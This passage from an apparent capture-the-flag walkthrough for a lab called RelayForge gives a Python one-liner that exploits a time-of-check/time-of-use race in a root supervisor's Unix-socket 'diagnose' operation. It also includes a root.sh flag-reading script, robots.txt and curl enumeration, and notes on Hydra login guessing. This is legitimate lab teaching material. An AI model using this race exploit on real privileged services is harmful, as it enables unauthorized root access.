printf '#!/bin/sh\nid\ncat /var/lib/relayforge/stages/STAGE_3_ROOT.txt\nprintf "ROOT_FLAG="\ncat /var/lib/relayforge/flag/root.txt\n' > root.sh
chmod 700 root.sh
```

Use Burp? No: this boundary is a Unix-domain socket, not HTTP. Python is justified here to send one newline-framed JSON request, wait for the exact validation acknowledgement, atomically replace the pathname, and stream the root child output. Each operation matters: connect; frame `diagnose` with job ID and exact name; read acknowledgement; replace via `os.replace`; then print the same connection's remaining bytes.

```sh
python3 -c 'import json,os,socket,sys; j=sys.argv[1]; s=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM); s.connect("/run/relayforge/supervisor.sock"); frame=(json.dumps({"op":"diagnose","job_id":j,"name":"diagnostic.sh"},separators=(",",":"))+"\n").encode(); s.sendall(frame); f=s.makefile("rb",buffering=0); ack=f.readline(); assert json.loads(ack)=={"ok":True,"state":"validated"}; os.replace("root.sh","diagnostic.sh"); sys.stdout.buffer.write(ack+f.read())' "$RF_JOB_ID"
```

**Expected finding:** acknowledgement followed by `id` reporting UID 0, the root-only Stage 3 marker, and `ROOT_FLAG=RF{...}`. Record the actual output only if reproduced; none is claimed here.

**Verified locally:** `tests/test_supervisor.py` passed. It replaces the checked pathname after the validation acknowledgement in a local socketpair harness and observes replacement execution under the test process identity. It validates race reachability and output plumbing, not unrestricted EC2 host root. **Source-confirmed:** Supervisor's unrestricted root service unit and path re-execution. **Unverified:** live EC2 operation, exact deployed service state, actual UID 0 response, and generated flag.

**Screenshot checkpoint:** benign file metadata before the request; acknowledgement; final `id` result; root marker access. Redact the root flag and socket/process details not needed for the report.

## Addendum: IP-Only Discovery and Verification Status

This addendum is authoritative where earlier sections imply more than the
current implementation proves. It is intentionally additive; it does not
replace the material above.

The exact Worker URI is discoverable by ordinary web enumeration through the
standard `robots.txt` resource. The current workspace Nginx configuration now
returns:

```text
User-agent: *
Allow: /artifacts/relay-worker
```

From the assigned IP, request that resource before guessing a path:

```bash
curl -kfsS "$RF_BASE/robots.txt"
```

The advertised path leads to the exact Worker file through Nginx's read-only
single-file mount. Download and inspect it only after observing that path:

```bash
curl -kfsS "$RF_BASE/artifacts/relay-worker" -o relay-worker
file relay-worker
sha256sum relay-worker
readelf -hW relay-worker
readelf -lW relay-worker
readelf -dW relay-worker
```

This clue is **source-confirmed in the current workspace**, but availability
from the EC2 deployment remains **unverified until redeployment and a remote
request**. A digest computed locally records the downloaded file; it is not an
authenticity check unless compared with an independently trusted deployment
digest.

The login credential stage is still **not established as a working IP-only
cracking stage**. Hydra requires candidate usernames/passwords and a valid
CSRF/session request; the deployment's login rate limit is eight requests per
minute plus a burst. The seeded `guest` credentials are in organizer-side
source and are not discoverable through the present public routes. Do not
describe generic wordlist guessing as successful or verified. The credential
stage needs a bounded candidate clue or an intentionally downloadable
offline-cracking artifact before this walkthrough is reproducible from only
the IP.

Likewise, a pre-request port scan cannot discover a live Worker: the port is
selected dynamically from `25000-25099` and is only listening while a job is
active. Learn the actual port from the authenticated request status, then test
that specific port. The final host operation in this version is Supervisor's
`diagnose` pathname TOCTOU; there is no `archive` operation.
